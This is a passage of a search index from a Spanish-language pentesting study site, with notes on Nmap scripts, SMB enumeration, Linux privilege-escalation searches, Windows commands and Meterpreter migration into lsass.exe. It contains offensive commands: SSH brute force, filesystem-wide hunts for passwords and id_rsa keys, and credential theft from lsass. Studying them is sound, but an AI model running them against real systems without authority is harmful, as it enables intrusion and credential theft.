\u2705 Enumeraci\u00f3n de servicios (Ej: descubrir versiones de software en ejecuci\u00f3n). \u2705 Autenticaci\u00f3n y fuerza bruta (Ej: probar contrase\u00f1as en SSH, FTP, etc.). \u2705 Detecci\u00f3n de malware y backdoors en sistemas comprometidos. \u2705 Escaneos avanzados de firewall y detecci\u00f3n de IDS.</p>"},{"location":"footprinting-and-scanning/nmap-scripting-engine/#ejemplos-de-uso-de-nse","title":"\ud83d\udcdc Ejemplos de uso de NSE","text":""},{"location":"footprinting-and-scanning/nmap-scripting-engine/#listar-todos-los-scripts-disponibles","title":"\ud83d\udd0d Listar todos los scripts disponibles","text":"<p><code>nmap --script-help=default</code></p>"},{"location":"footprinting-and-scanning/nmap-scripting-engine/#ejecutar-un-script-en-un-escaneo","title":"\ud83d\udee0\ufe0f Ejecutar un script en un escaneo","text":"<p><code>nmap --script http-title 192.168.1.1</code></p> <p>\ud83d\udd39 Muestra el t\u00edtulo de una p\u00e1gina web en el puerto 80 del host escaneado.</p>"},{"location":"footprinting-and-scanning/nmap-scripting-engine/#detectar-vulnerabilidades-conocidas","title":"\ud83d\udd11 Detectar vulnerabilidades conocidas","text":"<p><code>nmap --script vuln 192.168.1.1</code></p> <p>\ud83d\udd39 Busca vulnerabilidades en el host objetivo.</p>"},{"location":"footprinting-and-scanning/nmap-scripting-engine/#realizar-fuerza-bruta-en-ssh","title":"\ud83d\udca3 Realizar fuerza bruta en SSH","text":"<p><code>nmap --script ssh-brute -p 22 192.168.1.1</code></p> <p>\ud83d\udd39 Intenta adivinar credenciales en un servidor SSH.</p>"},{"location":"footprinting-and-scanning/nmap-scripting-engine/#enumerar-recursos-compartidos-en-una-red-windows-server-message-block-smb","title":"\ud83d\udda5\ufe0f Enumerar recursos compartidos en una red Windows [[Server Message Block (SMB)]]","text":"<p><code>nmap --script smb-enum-shares 192.168.1.1</code></p> <p>\ud83d\udd39 Lista los recursos compartidos accesibles en el sistema.</p>"},{"location":"footprinting-and-scanning/nmap-scripting-engine/#buscar-servidores-dns-abiertos","title":"\ud83d\udce1 Buscar servidores DNS abiertos","text":"<p><code>nmap --script dns-recursion 192.168.1.1</code></p> <p>\ud83d\udd39 Verifica si un servidor DNS permite consultas recursivas.</p>"},{"location":"footprinting-and-scanning/nmap/","title":"NMAP","text":""},{"location":"footprinting-and-scanning/nmap/#que-es-nmap","title":"\ud83d\udccc \u00bfQu\u00e9 es Nmap?","text":"<p>Nmap (abreviatura de Network Mapper) es una herramienta de c\u00f3digo abierto utilizada para el escaneo y an\u00e1lisis de redes. Fue dise\u00f1ada para descubrir dispositivos y servicios en una red, identificar puertos abiertos y determinar las configuraciones de seguridad.</p>"},{"location":"footprinting-and-scanning/nmap/#caracteristicas-principales","title":"\ud83d\udd0d Caracter\u00edsticas principales","text":"<p>\u2705 Escaneo de hosts y puertos: Permite descubrir dispositivos en una red y los puertos que tienen abiertos. \u2705 Detecci\u00f3n de servicios: Identifica qu\u00e9 aplicaciones o servicios est\u00e1n corriendo en un puerto espec\u00edfico. \u2705 Detecci\u00f3n de sistemas operativos: Puede inferir qu\u00e9 sistema operativo usa un dispositivo en funci\u00f3n de su respuesta a ciertos paquetes. \u2705 Detecci\u00f3n de firewall y filtrado: Ayuda a identificar reglas de firewall o dispositivos de seguridad en la red. \u2705 Escaneo de vulnerabilidades : Con scripts avanzados, puede detectar vulnerabilidades en los sistemas escaneados. [[Nmap Scripting Engine (NSE)]] \u2705 [[Enumeracion]] de informaci\u00f3n: Puede extraer datos detallados de servicios como SMB, FTP, SNMP, HTTP y m\u00e1s, incluyendo usuarios, recursos compartidos y configuraciones espec\u00edficas del sistema.</p> <p>\ud83d\ude80 Gracias a estas funciones, Nmap es una herramienta esencial en el pentesting y an\u00e1lisis de redes.</p>"},{"location":"footprinting-and-scanning/server-message-block/","title":"Server Message Block (SMB)","text":""},{"location":"footprinting-and-scanning/server-message-block/#que-es-smb","title":"\ud83d\udd0d \u00bfQu\u00e9 es SMB?","text":"<p>SMB (Server Message Block) es un protocolo de red utilizado principalmente en sistemas Windows para compartir archivos, impresoras y otros recursos entre dispositivos en una red. Tambi\u00e9n puede ser implementado en Linux y macOS mediante Samba.</p>"},{"location":"footprinting-and-scanning/server-message-block/#para-que-se-usa-smb","title":"\ud83d\udee0\ufe0f \u00bfPara qu\u00e9 se usa SMB?","text":"<p>\u2705 Compartir archivos y carpetas en una red local. \u2705 Acceder a impresoras y otros dispositivos compartidos. \u2705 Autenticaci\u00f3n de usuarios y permisos de acceso en redes empresariales. \u2705 Mapear unidades de red para acceder a archivos remotos como si fueran locales.</p>"},{"location":"footprinting-and-scanning/server-message-block/#puertos-utilizados-por-smb","title":"\ud83d\udccc Puertos utilizados por SMB","text":"<ul> <li>Puerto 139/TCP \u2192 Utilizado en SMB sobre NetBIOS (antiguo, Windows XP y anteriores).</li> <li>Puerto 445/TCP \u2192 Utilizado en SMB directo (Windows 2000 en adelante, sin necesidad de NetBIOS).</li> </ul>"},{"location":"footprinting-and-scanning/server-message-block/#seguridad-en-smb","title":"\u2622\ufe0f Seguridad en SMB","text":"<p>\u274c Evita SMBv1: Es un protocolo obsoleto y vulnerable (desact\u00edvalo si es posible). \ud83d\udd10 Usa credenciales seguras: No permitas accesos an\u00f3nimos sin restricciones. \ud83d\udee1\ufe0f Monitorea el tr\u00e1fico SMB: Puede ser un punto de entrada para ataques de ransomware.</p>"},{"location":"footprinting-and-scanning/server-message-block/#explorando-smb-con-nmap-nse","title":"\ud83d\udd0e Explorando SMB con Nmap (NSE)","text":"<p>SMB es un objetivo com\u00fan en auditor\u00edas de seguridad, ya que ha tenido m\u00faltiples vulnerabilidades explotables como EternalBlue (MS17-010), utilizado por el ransomware WannaCry.</p>"},{"location":"footprinting-and-scanning/server-message-block/#detectar-si-smb-esta-activo-en-un-host","title":"\ud83d\udee0\ufe0f Detectar si SMB est\u00e1 activo en un host","text":"<p><code>nmap -p 445 --script smb-os-discovery 192.168.1.1</code></p> <p>\ud83d\udd39 Descubre el sistema operativo y detalles del servicio SMB.</p>"},{"location":"footprinting-and-scanning/server-message-block/#obtener-informacion-sobre-el-nivel-de-seguridad-del-smb","title":"\ud83d\udd10Obtener informacion sobre el nivel de seguridad del SMB","text":"<p><code>nmap -p445 --script smb-security-mode 192.168.1.1</code></p>"},{"location":"footprinting-and-scanning/server-message-block/#enumerar-sesiones-activas-en-el-servicio-smb","title":"\ud83d\ude4d\u200d\u2642\ufe0fEnumerar sesiones activas en el servicio SMB","text":"<p><code>nmap -p445 --script smb-enum-sessions 192.168.1.1</code></p> <p>Este script intenta enumerar sesiones de SMB activas en el host de destino. Esto puede revelar: \u2705 Usuarios conectados a recursos compartidos. \u2705 Dispositivos que tienen sesiones abiertas en la m\u00e1quina. \u2705 Posibles accesos an\u00f3nimos o usuarios con credenciales d\u00e9biles.</p>"},{"location":"footprinting-and-scanning/server-message-block/#enumerar-sesiones-activas-en-el-servicio-smb-con-credenciales","title":"\ud83d\ude4d\u200d\u2642\ufe0fEnumerar sesiones activas en el servicio SMB con credenciales","text":"<p>Algunos servidores bloquean la enumeracion de sesiones a usuarios anonimos. Si el script no devuelve informacion, prueba con credenciales:</p> <p><code>nmap -p445 --script smb-enum-sessions --script-args smbuser=usuario,smbpass=contrase\u00f1a demo.ine.local</code></p> <p>\ud83d\udd39Esto puede revelar mas detalles si tenemos acceso autorizado.</p>"},{"location":"footprinting-and-scanning/server-message-block/#listar-recursos-compartidos-en-una-red-windows","title":"\ud83d\udcc2 Listar recursos compartidos en una red Windows*","text":"<p><code>nmap --script smb-enum-shares -p 445 192.168.1.1</code></p> <p>\ud83d\udd39 Muestra carpetas compartidas y permisos.</p>"},{"location":"footprinting-and-scanning/server-message-block/#enumerar-usuarios-windows-en-la-maquina-objetivo","title":"Enumerar usuarios windows en la maquina objetivo","text":"<p><code>nmap -p445 --script smb-enum-users --script-args smbuser=yoususer,smbpass=yourpass 192.168.1.1</code></p>"},{"location":"footprinting-and-scanning/server-message-block/#obtener-informacion-sobre-las-estadisticas-del-servidor","title":"Obtener informacion sobre las estadisticas del servidor","text":"<p><code>nmap -p445 --script smb-server-stats --script-args smbuser=youruser,smbpass=yourpass 192.168.1.1</code></p>"},{"location":"footprinting-and-scanning/server-message-block/#obtener-informacion-sobre-los-dominios-del-servidor","title":"Obtener informacion sobre los dominios del servidor","text":"<p><code>nmap -p445 --script smb-enum-domains --script-args smbuser=youruser,smbpass=yourpass 192.168.1.1</code></p>"},{"location":"footprinting-and-scanning/server-message-block/#enumerar-grupos-en-la-maquina-objetivo","title":"Enumerar grupos en la maquina objetivo","text":"<p><code>nmap -p445 --script smb-enum-groups --script-args smbuser=youruser,smbpass=yourpass 192.168.1.1</code></p>"},{"location":"footprinting-and-scanning/server-message-block/#enumerar-servicios-en-la-maquina-objetivo","title":"Enumerar servicios en la maquina objetivo","text":"<p><code>nmap -p445 --script smb-enum-services --script-args smbuser=youruser,smbpass=yourpass 192.168.1.1</code></p>"},{"location":"footprinting-and-scanning/server-message-block/#enumerar-todas-las-carpetas-y-drivers-compartidos","title":"Enumerar todas las carpetas y drivers compartidos","text":"<p>Usado para listar archivos, carpetas, similar al comando \"dir\" en windows, en todas las carpetas compartidas.</p> <p><code>nmap -p445 --script smb-enum-shares,smb-ls --script-args smbuser=youruser,smbpass=yourpass 192.168.1.1</code></p>"},{"location":"footprinting-and-scanning/server-message-block/#descubrir-nombre-de-equipo-netbios-del-servidor-smb","title":"Descubrir nombre de equipo NetBIOS del servidor SMB","text":"<p><code>nmap --script smb-os-discovery-nse -p 445 192.168.1.1</code></p>"},{"location":"guia/intro/","title":"Intro","text":""},{"location":"guia/intro/#introduccion-awdaw","title":"Introducci\u00f3n awdaw","text":""},{"location":"operating-systems/linux/privilege-escalation/common-commands/","title":"Privilege Escalation","text":"<p>Comandos en Linux que pueden ayudarte a encontrar archivos con permisos inseguros y que podr\u00edan ser \u00fatiles para escalar privilegios o corregir problemas de seguridad. Aqu\u00ed te dejo algunas alternativas y variaciones.</p>"},{"location":"operating-systems/linux/privilege-escalation/common-commands/#1-buscar-archivos-con-permisos-peligrosos-ow-777-suid-guid","title":"\ud83d\udccc 1\ufe0f\u20e3 Buscar archivos con permisos peligrosos (<code>o+w</code>, <code>777</code>, <code>SUID</code>, <code>GUID</code>)","text":""},{"location":"operating-systems/linux/privilege-escalation/common-commands/#11-archivos-que-cualquier-usuario-puede-escribir-ow","title":"1.1. Archivos que cualquier usuario puede escribir (<code>o+w</code>)","text":"<pre><code>find / -type f -perm -o+w 2&gt;/dev/null\n</code></pre> <p>\ud83d\udd0e Encuentra archivos normales (<code>-type f</code>) que cualquier usuario puede escribir (<code>-perm -o+w</code>).</p>"},{"location":"operating-systems/linux/privilege-escalation/common-commands/#12-directorios-que-cualquier-usuario-puede-modificar-ow","title":"1.2. Directorios que cualquier usuario puede modificar (<code>o+w</code>)","text":"<pre><code>find / -type d -perm -o+w 2&gt;/dev/null\n</code></pre> <p>\ud83d\udd0e Encuentra directorios que cualquier usuario puede modificar. \ud83d\udca1 IMPORTANTE: Si un directorio <code>/home/user/privado</code> tiene <code>o+w</code>, un atacante puede crear archivos en \u00e9l.</p>"},{"location":"operating-systems/linux/privilege-escalation/common-commands/#13-archivos-con-permisos-777-cualquiera-puede-leer-escribir-y-ejecutar","title":"1.3. Archivos con permisos <code>777</code> (cualquiera puede leer, escribir y ejecutar)","text":"<pre><code>find / -perm 777 2&gt;/dev/null\n</code></pre> <p>\ud83d\udd0e Peligroso en carpetas como <code>/etc</code>, <code>/var</code>, <code>/root</code>, <code>/usr/bin</code>, etc.</p>"},{"location":"operating-systems/linux/privilege-escalation/common-commands/#14-archivos-con-suid-setuid","title":"1.4. Archivos con SUID (<code>setuid</code>)","text":"<pre><code>find / -type f -perm -4000 2&gt;/dev/null\n</code></pre> <p>\ud83d\udd0e Encuentra archivos que tienen el bit SUID activo, lo que significa que se ejecutan con los permisos del due\u00f1o (normalmente root).</p> <p>\ud83d\udca1 Si encuentras un binario con SUID en <code>/usr/bin</code>, podr\u00edas explotarlo para obtener privilegios elevados.</p>"},{"location":"operating-systems/linux/privilege-escalation/common-commands/#15-archivos-con-guid-setgid","title":"1.5. Archivos con GUID (<code>setgid</code>)","text":"<pre><code>find / -type f -perm -2000 2&gt;/dev/null\n</code></pre> <p>\ud83d\udd0e Encuentra archivos con el bit GUID activo, lo que significa que se ejecutan con los permisos del grupo al que pertenecen.</p>"},{"location":"operating-systems/linux/privilege-escalation/common-commands/#2-buscar-archivos-de-un-usuario-especifico","title":"\ud83d\udccc 2\ufe0f\u20e3 Buscar archivos de un usuario espec\u00edfico","text":""},{"location":"operating-systems/linux/privilege-escalation/common-commands/#21-archivos-propiedad-de-root-y-modificables-por-cualquier-usuario","title":"2.1. Archivos propiedad de <code>root</code> y modificables por cualquier usuario","text":"<pre><code>find / -user root -perm -o+w 2&gt;/dev/null\n</code></pre> <p>\ud83d\udd0e Encuentra archivos propiedad de root pero que cualquier usuario puede modificar.</p> <p>\ud83d\udca1 Esto es un gran riesgo de seguridad: si puedes editar un script de root, podr\u00edas modificarlo para ejecutar comandos maliciosos.</p>"},{"location":"operating-systems/linux/privilege-escalation/common-commands/#22-archivos-dentro-de-etc-que-cualquier-usuario-puede-modificar","title":"2.2. Archivos dentro de <code>/etc</code> que cualquier usuario puede modificar","text":"<pre><code>find /etc -perm -o+w 2&gt;/dev/null\n</code></pre> <p>\ud83d\udd0e Si encuentras archivos en <code>/etc</code> con permisos de escritura para otros usuarios, pueden ser usados para persistencia o escalaci\u00f3n de privilegios.</p>"},{"location":"operating-systems/linux/privilege-escalation/common-commands/#3-buscar-archivos-ocultos-en-el-sistema","title":"\ud83d\udccc 3\ufe0f\u20e3 Buscar archivos ocultos en el sistema","text":"<pre><code>find / -name \".*\" 2&gt;/dev/null\n</code></pre> <p>\ud83d\udd0e Encuentra archivos ocultos, que pueden ser usados para esconder backdoors.</p>"},{"location":"operating-systems/linux/privilege-escalation/common-commands/#4-buscar-archivos-que-contienen-contrasenas","title":"\ud83d\udccc 4\ufe0f\u20e3 Buscar archivos que contienen contrase\u00f1as","text":""},{"location":"operating-systems/linux/privilege-escalation/common-commands/#41-archivos-que-contengan-la-palabra-password","title":"4.1. Archivos que contengan la palabra <code>password</code>","text":"<pre><code>grep -iRl \"password\" /etc 2&gt;/dev/null\n</code></pre> <p>\ud83d\udd0e Busca archivos que contengan la palabra \"password\" en <code>/etc</code>.</p>"},{"location":"operating-systems/linux/privilege-escalation/common-commands/#42-buscar-en-todo-el-sistema","title":"4.2. Buscar en todo el sistema (<code>/</code>)","text":"<pre><code>grep -iRl \"password\" / 2&gt;/dev/null\n</code></pre> <p>\ud83d\udca1 \u00datil para encontrar credenciales almacenadas en texto plano.</p>"},{"location":"operating-systems/linux/privilege-escalation/common-commands/#5-buscar-procesos-ejecutados-por-root","title":"\ud83d\udccc 5\ufe0f\u20e3 Buscar procesos ejecutados por <code>root</code>","text":"<pre><code>ps aux | grep root\n</code></pre> <p>\ud83d\udd0e Muestra procesos ejecut\u00e1ndose como <code>root</code>. \ud83d\udca1 Si encuentras un proceso mal configurado, podr\u00edas explotarlo para ganar privilegios.</p>"},{"location":"operating-systems/linux/privilege-escalation/common-commands/#6-buscar-archivos-con-credenciales-ssh","title":"\ud83d\udccc 6\ufe0f\u20e3 Buscar archivos con credenciales SSH","text":"<pre><code>find / -name \"id_rsa\" 2&gt;/dev/null\n</code></pre> <p>\ud83d\udd0e Encuentra claves privadas SSH (<code>id_rsa</code>), que pueden permitir acceso a otros servidores.</p> <p>Para generar una contrase\u00f1a segura y agregarla al archivo <code>/etc/shadow</code>, puedes seguir estos pasos:</p>"},{"location":"operating-systems/linux/privilege-escalation/common-commands/#1-generar-una-contrasena-cifrada-con-openssl","title":"\ud83d\udccc 1\ufe0f\u20e3 Generar una contrase\u00f1a cifrada con <code>openssl</code>","text":"<pre><code>openssl passwd -6 -salt $(openssl rand -base64 6) \"MiSuperPassword123!\"\n</code></pre>"},{"location":"operating-systems/windows/cmd/","title":"CMD","text":""},{"location":"operating-systems/windows/cmd/#comando","title":"Comando:","text":"<p><code>net localgroup</code></p>"},{"location":"operating-systems/windows/cmd/#que-hace-este-comando","title":"Qu\u00e9 hace este comando:","text":"<ul> <li>Muestra todos los grupos locales en el sistema, como Administradores, Usuarios, Invitados, Operadores de copias de seguridad, etc.</li> </ul>"},{"location":"operating-systems/windows/cmd/#para-ver-los-detalles-de-los-miembros-de-un-grupo-especifico","title":"Para ver los detalles de los miembros de un grupo espec\u00edfico:","text":"<p>Si deseas ver los miembros de un grupo espec\u00edfico (por ejemplo, el grupo Administradores), puedes usar el siguiente comando:</p> <p><code>net localgroup Administradores</code></p>"},{"location":"operating-systems/windows/cmd/#ejemplo-de-uso","title":"Ejemplo de uso:","text":"<p>Si ejecutas este comando en una ventana de CMD, te dar\u00e1 una lista de todos los miembros que pertenecen al grupo Administradores del sistema:</p> <pre><code>C:\\&gt; net localgroup Administradores El comando se complet\u00f3 correctamente.  Grupo de usuarios local Administradores\n-----------------------------------------     Administrador     Usuario1     Usuario2     ...\n</code></pre>"},{"location":"operating-systems/windows/cmd/#notas-adicionales","title":"Notas adicionales:","text":"<ul> <li>Los comandos <code>net localgroup</code> solo muestran grupos locales en el equipo actual, no los grupos de dominio si el equipo est\u00e1 unido a un dominio.</li> <li>Para ver los grupos de dominio (si el equipo est\u00e1 conectado a un dominio), usar\u00edas una herramienta como <code>net group</code> o <code>dsquery</code>.</li> </ul> <p>Para ver a qu\u00e9 grupos locales pertenece tu cuenta de usuario en Windows usando CMD (Command Prompt), puedes usar el siguiente comando:</p>"},{"location":"operating-systems/windows/cmd/#comando_1","title":"Comando:","text":"<pre><code>net user &lt;tu_nombre_de_usuario&gt;\n</code></pre>"},{"location":"operating-systems/windows/cmd/#ejemplo","title":"Ejemplo:","text":"<p>Si tu nombre de usuario es \"Juan\", el comando ser\u00eda:</p> <pre><code>net user Juan\n</code></pre>"},{"location":"operating-systems/windows/cmd/#que-hace-este-comando_1","title":"Qu\u00e9 hace este comando:","text":"<ul> <li>Muestra informaci\u00f3n sobre tu cuenta de usuario, incluidos los grupos a los que perteneces.</li> <li>En la salida, podr\u00e1s ver algo como esto:</li> </ul> <pre><code>C:\\&gt; net user Juan\nNombre de usuario                    Juan\nFull Name                            Juan Perez\nComentario                           Cuenta de usuario\n...\n\nMiembro de los grupos siguientes:\n    * Administradores\n    * Usuarios\n    * ...\n</code></pre>"},{"location":"operating-systems/windows/cmd/#explicacion","title":"Explicaci\u00f3n:","text":"<ul> <li>Bajo la secci\u00f3n \"Miembro de los grupos siguientes\", ver\u00e1s una lista de los grupos locales a los que pertenece tu cuenta de usuario.</li> <li>En el ejemplo anterior, Juan ser\u00eda miembro de los grupos Administradores y Usuarios.</li> </ul>"},{"location":"operating-systems/windows/cmd/#notas","title":"Notas:","text":"<ul> <li>Este comando solo muestra los grupos locales a los que pertenece tu cuenta en ese equipo espec\u00edfico.</li> <li>Si est\u00e1s en un entorno de dominio, tambi\u00e9n podr\u00edas ser miembro de grupos de dominio, pero este comando solo muestra los grupos locales. Para ver los grupos de dominio, necesitar\u00edas usar herramientas adicionales, como <code>dsget</code> o <code>net group</code> (si est\u00e1s en un dominio).</li> </ul>"},{"location":"operating-systems/windows/common-services/","title":"Common services","text":"Servicio Nombre en el sistema Puertos Asociados Explotaci\u00f3n Com\u00fan Mitigaci\u00f3n [[Server Message Block (SMB)]] <code>LanmanServer</code> TCP 445 - EternalBlue (MS17-010)  - EternalRomance  - SMBGhost (CVE-2020-0796) - Deshabilitar SMBv1  - Restringir acceso a TCP 445  - Aplicar parches de seguridad [[RDP (Remote Desktop Protocol)]] <code>TermService</code> TCP 3389 - BlueKeep (CVE-2019-0708)  - Fuerza bruta de credenciales - Bloquear acceso externo a RDP  - Activar MFA y usar VPN Windows Print Spooler <code>Spooler</code> - - PrintNightmare (CVE-2021-34527)  - Escalada de privilegios - Deshabilitar si no es necesario  - Aplicar parches de seguridad Windows Management Instrumentation (WMI) <code>Winmgmt</code> - (RPC) - Movimiento lateral  - Ejecuci\u00f3n remota de c\u00f3digo - Restringir acceso WMI  - Monitorizar tr\u00e1fico RPC Netlogon (Autenticaci\u00f3n de dominio) <code>Netlogon</code> TCP 135, 139, 445 - Zerologon (CVE-2020-1472)  - Escalada de privilegios en dominios - Aplicar parches  - Restringir acceso a puertos de Netlogon [[Windows Remote Management (WinRM)]] <code>WinRM</code> TCP 5985 (HTTP), TCP 5986 (HTTPS) - Ejecuci\u00f3n remota de c\u00f3digo  - Uso en ataques Living off the Land - Deshabilitar si no es necesario  - Restringir acceso solo a administradores Task Scheduler <code>Schedule</code> - - Persistencia de malware  - Ejecuci\u00f3n de scripts maliciosos - Restringir creaci\u00f3n de tareas  - Monitorizar tareas programadas BITS (Background Intelligent Transfer Service) <code>BITS</code> - - Descarga de malware en segundo plano - Restringir acceso a BITS  - Monitorizar tr\u00e1fico de red DNS Client <code>Dnscache</code> TCP/UDP 53 - SigRed (CVE-2020-1350)  - Envenenamiento de cach\u00e9 - Aplicar parches  - Usar servidores DNS seguros IKE and AuthIP IPsec Keying Modules (VPN/IPSec) <code>IKEEXT</code> UDP 500, UDP 4500 - Explotaci\u00f3n de VPNs mal configuradas - Usar autenticaci\u00f3n fuerte  - Monitorizar conexiones VPN Microsoft IIS (Internet Information Services) <code>W3SVC</code> TCP 80 (HTTP), TCP 443 (HTTPS), TCP 21 (FTP), TCP 8080 - RCE por desbordamiento de b\u00fafer (CVE-2017-7269)  - WebShells (<code>China Chopper</code>, <code>ASPXSpy</code>)  - Enumeraci\u00f3n de archivos (CVE-2010-2731)  - Vulnerabilidades en m\u00f3dulos como Exchange (CVE-2021-31207) - Mantener IIS actualizado  - Restringir ejecuci\u00f3n de scripts en directorios p\u00fablicos  - Usar autenticaci\u00f3n fuerte y permisos adecuados WebDAV (Web Distributed Authoring and Versioning) <code>WebClient</code> (cliente) / M\u00f3dulo WebDAV en IIS TCP 80 (HTTP), TCP 443 (HTTPS) - Subida de archivos maliciosos (<code>.asp</code>, <code>.php</code>, <code>.exe</code>)  - Fuerza bruta de credenciales  - Enumeraci\u00f3n y descarga de archivos sensibles  - Explotaci\u00f3n de WebDAV en IIS 6.0 (CVE-2017-7269) - Deshabilitar WebDAV si no es necesario  - Restringir permisos en directorios cr\u00edticos  - Bloquear m\u00e9todos HTTP inseguros (<code>PUT</code>, <code>DELETE</code>)"},{"location":"operating-systems/windows/important-proccess/","title":"important proccess","text":"<p>Migrar a <code>lsass.exe</code> es una t\u00e9cnica avanzada en el contexto de un ataque a un sistema Windows y se refiere a mover la sesi\u00f3n de Meterpreter (o cualquier otra sesi\u00f3n de acceso remoto) a un proceso cr\u00edtico del sistema como <code>lsass.exe</code> (Local Security Authority Subsystem Service).</p>"},{"location":"operating-systems/windows/important-proccess/#que-es-lsassexe","title":"\u00bfQu\u00e9 es <code>lsass.exe</code>?","text":"<p>El proceso <code>lsass.exe</code> es un proceso leg\u00edtimo de Windows responsable de gestionar las pol\u00edticas de seguridad y la autenticaci\u00f3n del sistema operativo. Algunas de sus funciones clave incluyen:</p> <ul> <li>Autenticaci\u00f3n de usuarios: Verifica las credenciales de los usuarios que intentan iniciar sesi\u00f3n en el sistema.</li> <li>Manejo de contrase\u00f1as: Gestiona las contrase\u00f1as de los usuarios y las almacena de manera segura.</li> <li>Generaci\u00f3n de tokens de acceso: Crea tokens de acceso para usuarios autenticados, que luego son utilizados para determinar los permisos de acceso a los recursos del sistema.</li> </ul> <p>Es un proceso cr\u00edtico para la seguridad y el funcionamiento de Windows. Si <code>lsass.exe</code> se ve comprometido o manipulado, esto puede tener graves consecuencias de seguridad, ya que las credenciales y las pol\u00edticas de seguridad del sistema est\u00e1n en juego.</p>"},{"location":"operating-systems/windows/important-proccess/#por-que-un-atacante-querria-migrar-a-lsassexe","title":"\u00bfPor qu\u00e9 un atacante querr\u00eda migrar a <code>lsass.exe</code>?","text":"<p>La migraci\u00f3n a <code>lsass.exe</code> ofrece varias ventajas para un atacante que busca tomar el control de un sistema Windows:</p>"},{"location":"operating-systems/windows/important-proccess/#1-escalada-de-privilegios-y-acceso-a-credenciales","title":"1. Escalada de privilegios y acceso a credenciales","text":"<ul> <li><code>lsass.exe</code> maneja la autenticaci\u00f3n y las credenciales de los usuarios en el sistema, incluyendo contrase\u00f1as. Los atacantes a menudo intentan inyectar c\u00f3digo malicioso en <code>lsass.exe</code> para extraer las credenciales de los usuarios (incluyendo contrase\u00f1as en texto claro si el sistema no est\u00e1 configurado adecuadamente).</li> <li>Ataque de \"Pass-the-Hash\": Si un atacante logra acceder a los hashes de las contrase\u00f1as (almacenadas por <code>lsass.exe</code>), puede utilizar esas credenciales para autenticarse en otros sistemas sin necesidad de conocer las contrase\u00f1as en texto claro.</li> </ul>"},{"location":"operating-systems/windows/important-proccess/#2-evasion-de-deteccion","title":"2. Evasi\u00f3n de detecci\u00f3n","text":"<ul> <li><code>lsass.exe</code> es un proceso esencial del sistema y generalmente no se monitorea ni se bloquea, ya que es cr\u00edtico para el funcionamiento del sistema operativo. Los antivirus y herramientas de seguridad suelen pasar por alto este proceso debido a su importancia, lo que lo convierte en un buen objetivo para la migraci\u00f3n de la sesi\u00f3n de Meterpreter. Al migrar a este proceso, un atacante puede operar en el sistema sin ser detectado por herramientas de seguridad.</li> </ul>"},{"location":"operating-systems/windows/important-proccess/#3-persistencia","title":"3. Persistencia","text":"<ul> <li>Si un atacante puede inyectar su c\u00f3digo dentro de <code>lsass.exe</code>, puede asegurar que su acceso al sistema sea m\u00e1s dif\u00edcil de eliminar, ya que el proceso <code>lsass.exe</code> es muy probable que siga ejecut\u00e1ndose mientras el sistema est\u00e9 en funcionamiento.</li> <li>Desactivar o matar el proceso <code>lsass.exe</code> puede causar un bloqueo del sistema, lo que lo convierte en un objetivo muy cr\u00edtico. Por lo tanto, la migraci\u00f3n a <code>lsass.exe</code> podr\u00eda garantizar que un atacante permanezca indetectado y con acceso al sistema.</li> </ul>"},{"location":"operating-systems/windows/important-proccess/#4-acceso-a-sistemas-de-autenticacion-y-otros-recursos","title":"4. Acceso a sistemas de autenticaci\u00f3n y otros recursos","text":"<ul> <li><code>lsass.exe</code> no solo maneja la autenticaci\u00f3n local, sino tambi\u00e9n servicios de autenticaci\u00f3n en red como Kerberos. Controlar o manipular este proceso podr\u00eda permitirle a un atacante manipular la autenticaci\u00f3n de red y comprometer otros sistemas dentro de la misma red, facilitando el movimiento lateral dentro de la infraestructura.</li> </ul>"},{"location":"operating-systems/windows/important-proccess/#como-migrar-a-lsassexe","title":"\u00bfC\u00f3mo migrar a <code>lsass.exe</code>?","text":"<p>La migraci\u00f3n a un proceso como <code>lsass.exe</code> no es tan simple como simplemente usar el comando <code>migrate</code> en Meterpreter. Para poder migrar a un proceso de este tipo, el atacante debe tener privilegios elevados, como los privilegios de \"SeDebugPrivilege\", que permiten a un proceso depurar y modificar otros procesos, incluso los cr\u00edticos como <code>lsass.exe</code>.</p> <p>En t\u00e9rminos pr\u00e1cticos:</p> <ol> <li> <p>Comando de migraci\u00f3n: En Meterpreter, se utilizar\u00eda el comando <code>migrate &lt;PID&gt;</code> para mover la sesi\u00f3n de Meterpreter a un proceso con el identificador de proceso (PID) de <code>lsass.exe</code>.</p> <p><code>meterpreter &gt; migrate &lt;PID_de_lsass.exe&gt;</code></p> </li> <li> <p>Privilegios requeridos: El atacante debe tener privilegios \"SeDebugPrivilege\" para poder interactuar con el proceso de <code>lsass.exe</code>, ya que es un proceso del sistema y protegido.</p> </li> </ol>"},{"location":"operating-systems/windows/important-proccess/#que-puede-hacer-un-atacante-al-migrar-a-lsassexe","title":"\u00bfQu\u00e9 puede hacer un atacante al migrar a <code>lsass.exe</code>?","text":"<ol> <li> <p>Captura de credenciales: Los atacantes pueden usar herramientas como Mimikatz para extraer contrase\u00f1as, hashes de contrase\u00f1as y otros datos de autenticaci\u00f3n almacenados en <code>lsass.exe</code>.</p> <p>Mimikatz es una herramienta popular que se usa para obtener credenciales de Windows al interactuar con <code>lsass.exe</code> y leer la memoria del proceso.</p> </li> <li> <p>Movimientos laterales: Si un atacante tiene acceso a los hashes de las contrase\u00f1as, puede usar t\u00e9cnicas como Pass-the-Hash para acceder a otros sistemas de la red.</p> </li> <li> <p>Escalada de privilegios: Si el atacante tiene acceso a un proceso de bajo privilegio (como un proceso de usuario est\u00e1ndar), migrar a <code>lsass.exe</code> puede ofrecer la posibilidad de escalar sus privilegios a SYSTEM o Administrator, lo que le da un control completo del sistema.</p> </li> </ol>"},{"location":"operating-systems/windows/important-proccess/#por-que-es-peligroso","title":"\u00bfPor qu\u00e9 es peligroso?","text":"<p>La migraci\u00f3n a <code>lsass.exe</code> puede ser extremadamente peligrosa porque, si se compromete, todo el sistema de autenticaci\u00f3n y las credenciales de los usuarios est\u00e1n en riesgo. Manipular <code>lsass.exe</code> da al atacante acceso total a las credenciales almacenadas, lo que puede permitirle moverse lateralmente dentro de la red, tomar el control de otros sistemas y ejecutar ataques adicionales como el \"Pass-the-Hash\".</p>"},{"location":"operating-systems/windows/important-proccess/#resumen","title":"Resumen","text":"<p>Migrar a <code>lsass.exe</code> es una t\u00e9cnica avanzada utilizada para obtener control total sobre las credenciales de usuario y moverse lateralmente dentro de una red. Esto requiere privilegios elevados, como SeDebugPrivilege, y es una de las maneras m\u00e1s efectivas de escalar privilegios y persistir en el sistema.</p>"},{"location":"operating-systems/windows/protocols/server-message-block/","title":"Server Message Block (SMB)","text":"<p>[[Server Message Block (SMB)]] es un [[protocolos de red]] que permite compartir archivos, impresoras y otros recursos entre dispositivos dentro de una 